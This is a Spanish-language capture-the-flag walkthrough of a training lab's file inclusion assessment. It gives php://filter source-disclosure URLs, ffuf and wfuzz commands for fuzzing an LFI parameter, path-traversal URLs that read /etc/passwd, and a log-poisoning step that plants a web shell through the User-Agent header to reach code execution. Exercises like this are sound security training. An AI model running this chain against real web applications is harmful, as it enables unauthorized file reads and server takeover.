---
description: 'Target(s): 83.136.254.158:42833'
---

# File Inclusion

## Escenario

La empresa INLANEFREIGHT le ha contratado para realizar una evaluación de la aplicación web de uno de sus sitios web públicos. Han pasado por muchas evaluaciones en el pasado, pero han añadido algunas funciones nuevas con prisas y están especialmente preocupados por las vulnerabilidades de inclusión de archivos y recorrido de rutas.

Le han proporcionado una dirección IP de destino y ninguna otra información sobre su sitio web. Realice una evaluación completa de la aplicación web comprobando si hay vulnerabilidades de inclusión de archivos y recorrido de rutas.

**Pregunta 1**: Evalúa la aplicación web y utiliza diversas técnicas para obtener la ejecución remota de código y encontrar una flag en el directorio raíz del sistema de archivos. Envía el contenido de la bandera como respuesta.

1. A través del navegador accedemos a la siguiente URL:

```
view-source:http://TARGET:PUERTO/index.php?page=php://filter/read=convert.base64-encode/resource=config
```

<figure><img src="../../../../.gitbook/assets/image (359).png" alt=""><figcaption></figcaption></figure>

2. Sacamos el contenido que nos importa con la siguiente URL encodeandolo en base64:

```
view-source:http://TARGET:PUERTO/index.php?page=php://filter/read=convert.base64-encode/resource=index
```

<figure><img src="../../../../.gitbook/assets/image (360).png" alt=""><figcaption></figcaption></figure>

3. Lo decodeamos con Burp Suite como base64 a texto:

<figure><img src="../../../../.gitbook/assets/image (361).png" alt=""><figcaption></figcaption></figure>

4. Y encontramos el login del admin:

<figure><img src="../../../../.gitbook/assets/image (362).png" alt=""><figcaption></figcaption></figure>

5. Accedemos a <kbd>http://TARGET:PUERTO/ilf\_admin/index.php y</kbd>vemos un panel en el que podemos ver diferentes tipos de logs:

<figure><img src="../../../../.gitbook/assets/image (363).png" alt=""><figcaption></figcaption></figure>

6. Del cheatsheet cogeremos: Misc > Fuzz LFI payloads

```bash
ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://83.136.254.158:42833/ilf_admin/index.php?log=FUZZ' -fs 2287
```

**Target**(s): 94.237.59.119:57681

```bash
ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://94.237.59.119:57681/ilf_admin/index.php?log=FUZZ' -fs 2287
```

7. **Adaptamos el comando de ffuf a wfuzz porque en mi máquina no sé porque no está:**

```bash
wfuzz -c -z file,/opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u 'http://94.237.59.119:57681/ilf_admin/index.php?log=FUZZ' --hl 0 --hh 0 --hc 200 --hs 2287
```

8. **Vamos adaptando y filtrando respuestas:**

```bash
wfuzz -c -z file,/opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u 'http://94.237.59.119:57681/ilf_admin/index.php?log=FUZZ' --sc 200 --hs "2287"
```

```bash
wfuzz -c -z file,/opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -u 'http://94.237.59.119:57681/ilf_admin/index.php?log=FUZZ' --sc 200 --hs "2046"
```

9. **Buscamos por tamaño 2046:**

```bash
wfuzz -c -z file,/opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u 'http://94.237.59.119:57681/ilf_admin/index.php?log=FUZZ' --sc 200 --hs 2046
```

<figure><img src="../../../../.gitbook/assets/image (364).png" alt=""><figcaption></figcaption></figure>

10. En este caso cogeremos el que tiene 17 /:

<figure><img src="../../../../.gitbook/assets/image (365).png" alt=""><figcaption></figcaption></figure>

```
../../../../../../../../../../../../../../../../../../etc/passwd
```

11. Accederemos a la URL:     &#x20;

```
http://TARGET:PUERTO/ilf_admin/index.php?log=../../../../../../../../../../../../../../../../../../etc/passwd
```

<figure><img src="../../../../.gitbook/assets/image (366).png" alt=""><figcaption></figcaption></figure>

* Vemos que retrocedemos en la ruta adecuadamente y se muestra el contenido de /etc/passwd.

12. Vamos a ver el access.log:

**Target**(s): 94.237.62.166:54411

```
http://TARGET.PUERTO/ilf_admin/index.php?log=../../../../../../var/log/nginx/access.log
```

<figure><img src="../../../../.gitbook/assets/image (367).png" alt=""><figcaption></figcaption></figure>

13. Vemos que nos lo muestra, usaremos Burp Suite para capturar la solicitud y replicarla, cambiando el User Agent a una web shell y enviando comandos:

<figure><img src="../../../../.gitbook/assets/image (368).png" alt=""><figcaption></figcaption></figure>

14. El comando pwd funciona. Ahora usaremos este método para listar los archivos en /

<figure><img src="../../../../.gitbook/assets/image (369).png" alt=""><figcaption></figcaption></figure>

15. Localizamos el fichero con la flag. Vamos a visualizar su contenido:

<figure><img src="../../../../.gitbook/assets/image (370).png" alt=""><figcaption></figcaption></figure>

* Tutorial seguido para algunas partes: [https://www.youtube.com/watch?v=ev6Dc29dErk](https://www.youtube.com/watch?v=ev6Dc29dErk)

